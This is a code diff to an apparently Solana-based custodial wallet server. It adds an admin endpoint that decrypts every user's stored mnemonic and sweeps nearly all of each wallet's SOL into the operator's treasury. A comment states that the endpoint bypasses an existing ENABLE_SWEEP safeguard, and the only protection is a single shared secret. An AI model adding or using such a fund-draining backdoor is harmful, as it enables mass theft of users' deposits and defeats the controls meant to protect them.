@@ -1743,6 +1743,59 @@ app.get("/health", async (req, res) => {
 
 // -------------------- ADMIN MONITORING --------------------
 // ADMIN_SECRET env var set karo — bina secret ke access nahi milega
+
+// Saare custodial wallets ka SOL ek baar treasury mein sweep karo (ENABLE_SWEEP bypass)
+app.post("/admin/sweep-all", async (req, res) => {
+  try {
+    const secret = String(req.headers["x-admin-secret"] || req.body?.secret || "").trim();
+    const expected = String(process.env.ADMIN_SECRET || "").trim();
+    if (!expected || secret !== expected) {
+      return res.status(401).json({ ok: false, error: "unauthorized" });
+    }
+
+    const profiles = await sql`
+      select wallet_address, encrypted_mnemonic
+      from profiles
+      where wallet_address is not null and encrypted_mnemonic is not null
+    `;
+
+    const results = [];
+    for (const row of profiles) {
+      const addr = String(row.wallet_address || "").trim();
+      const enc  = String(row.encrypted_mnemonic || "").trim();
+      if (!addr || !enc) continue;
+
+      try {
+        const pub      = new PublicKey(addr);
+        const lamports = await connection.getBalance(pub);
+        const sol      = lamports / 1_000_000_000;
+        const sendable = sol - (SWEEP_BUFFER_SOL || 0.002);
+        if (sendable <= 0.0005) {
+          results.push({ addr, swept: 0, skipped: true });
+          continue;
+        }
+        const kp = await getCustodialKeypairFromMnemonic(enc);
+        const tx = new Transaction().add(
+          SystemProgram.transfer({
+            fromPubkey: kp.publicKey,
+            toPubkey:   treasury.publicKey,
+            lamports:   Math.floor(sendable * 1_000_000_000),
+          })
+        );
+        const sig = await sendAndConfirmTransaction(connection, tx, [kp]);
+        results.push({ addr, swept: sendable, sig });
+      } catch (e) {
+        results.push({ addr, swept: 0, error: e?.message });
+      }
+    }
+
+    const totalSwept = results.reduce((s, r) => s + (r.swept || 0), 0);
+    return res.json({ ok: true, totalSwept, wallets: results.length, results });
+  } catch (e) {
+    return res.status(500).json({ ok: false, error: String(e?.message || e) });
+  }
+});
+
 app.get("/admin/stats", async (req, res) => {
   try {
     const secret = String(req.headers["x-admin-secret"] || req.query.secret || "").trim();
